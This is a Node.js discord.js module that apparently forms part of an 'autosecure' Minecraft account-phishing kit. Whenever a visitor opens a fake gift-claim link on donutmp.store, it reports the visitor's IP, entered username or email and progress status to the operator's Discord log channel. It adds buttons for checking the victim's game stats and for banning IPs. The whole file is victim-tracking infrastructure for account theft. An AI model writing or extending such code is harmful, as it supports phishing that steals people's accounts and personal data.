const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { queryParams } = require("../../db/database");
const { autosecureMap } = require("../../mainbot/handlers/botHandler");

function formatDiscordTime(date = new Date()) {
    return date.toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' }) + ' ' + (date.getHours() < 12 ? 'SA' : 'CH');
}

/**
 * Send real-time checkout & web visitor logs directly to the sub-bot's #logs channel
 */
async function sendWebLog({ code, ip, link, domain = "donutmp.store", username, email, action = "click_link", statusText = "Click Continue" }) {
    try {
        let targetBot = null;
        let botUserId = null;

        // 1. Resolve bot from gift code
        if (code) {
            const rows = await queryParams(`SELECT bot_user_id, bot_number FROM gift_links WHERE code = ?`, [code]);
            if (rows.length > 0) {
                botUserId = rows[0].bot_user_id;
                const botNumber = rows[0].bot_number || 1;
                targetBot = autosecureMap.get(`${botUserId}|${botNumber}`);
            }
        }

        // Fallback to any active sub-bot if specific one not resolved
        if (!targetBot) {
            for (const [key, bot] of autosecureMap.entries()) {
                if (bot && bot.isReady && bot.isReady()) {
                    targetBot = bot;
                    botUserId = key.split('|')[0];
                    break;
                }
            }
        }

        if (!targetBot) {
            console.warn("[WEB LOGGER] No active sub-bot available to send log.");
            return false;
        }

        // 2. Fetch logs_channel for this bot
        const settingsRows = await queryParams(`SELECT logs_channel FROM autosecure WHERE user_id = ?`, [botUserId || targetBot.username]);
        if (settingsRows.length === 0 || !settingsRows[0].logs_channel) {
            console.warn(`[WEB LOGGER] No logs_channel configured for bot user ${botUserId}`);
            return false;
        }

        const [channelId] = settingsRows[0].logs_channel.split('|');
        if (!channelId) return false;

        const channel = targetBot.channels.cache.get(channelId) || await targetBot.channels.fetch(channelId).catch(() => null);
        if (!channel) {
            console.warn(`[WEB LOGGER] Could not access channel ${channelId}`);
            return false;
        }

        const cleanIp = (ip || "127.0.0.1").replace(/^.*:/, '');
        const timeDisplay = formatDiscordTime();
        const footerText = `Web checkout • ${domain} • Hôm nay lúc ${timeDisplay}`;

        if (action === "click_link") {
            // Embed 1: New user clicked the link (Image 1 top)
            const embed = new EmbedBuilder()
                .setTitle(ip || "Unknown IP")
                .setColor(0x2B2D31)
                .setDescription(
                    `**New user clicked the link**\n\n` +
                    `\`\`\`\n` +
                    `IP: ${ip}\n` +
                    `Link: ${link || `${domain}/gift/${code || 'claim'}/claim`}\n` +
                    `\`\`\``
                )
                .setThumbnail("https://mc-heads.net/avatar/steve")
                .setFooter({ text: footerText });

            const actionRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`banip|${ip}`)
                    .setLabel("Ban")
                    .setStyle(ButtonStyle.Danger),
                new ButtonBuilder()
                    .setCustomId(`unbanip|${ip}`)
                    .setLabel("Unban")
                    .setStyle(ButtonStyle.Primary)
            );

            await channel.send({ embeds: [embed], components: [actionRow] });
            return true;

        } else {
            // Embed 2: Username | Status (Image 1 bottom)
            const targetName = (username || email || "Guest").trim();
            const avatarSkin = (username && !username.includes("@")) ? username : "steve";

            const embed = new EmbedBuilder()
                .setTitle(ip || "Unknown IP")
                .setColor(0x2B2D31)
                .setDescription(
                    `**Username | Status**\n\n` +
                    `\`\`\`\n` +
                    `${targetName} | ${statusText}\n` +
                    `\`\`\``
                )
                .setThumbnail(`https://mc-heads.net/avatar/${encodeURIComponent(avatarSkin)}`)
                .setFooter({ text: footerText });

            // Row 1: Quick stats inspection buttons
            const statsRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`duels2|${avatarSkin}`)
                    .setLabel("Duels")
                    .setEmoji("🗡️")
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`skywars2|${avatarSkin}`)
                    .setLabel("Skywars")
                    .setEmoji("🏹")
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`skyblock2|${avatarSkin}`)
                    .setLabel("Skyblock")
                    .setEmoji("🌐")
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`bedwars2|${avatarSkin}`)
                    .setLabel("Bedwars")
                    .setEmoji("🛏️")
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`donut2|${avatarSkin}`)
                    .setLabel("DonutSMP")
                    .setEmoji("🍩")
                    .setStyle(ButtonStyle.Secondary)
            );

            // Row 2: Ban & Unban buttons
            const manageRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`banip|${ip}`)
                    .setLabel("Ban")
                    .setStyle(ButtonStyle.Danger),
                new ButtonBuilder()
                    .setCustomId(`unbanip|${ip}`)
                    .setLabel("Unban")
                    .setStyle(ButtonStyle.Primary)
            );

            await channel.send({ embeds: [embed], components: [statsRow, manageRow] });
            return true;
        }

    } catch (err) {
        console.error("[WEB LOGGER] Error dispatching web log to Discord:", err.message);
        return false;
    }
}

module.exports = { sendWebLog };
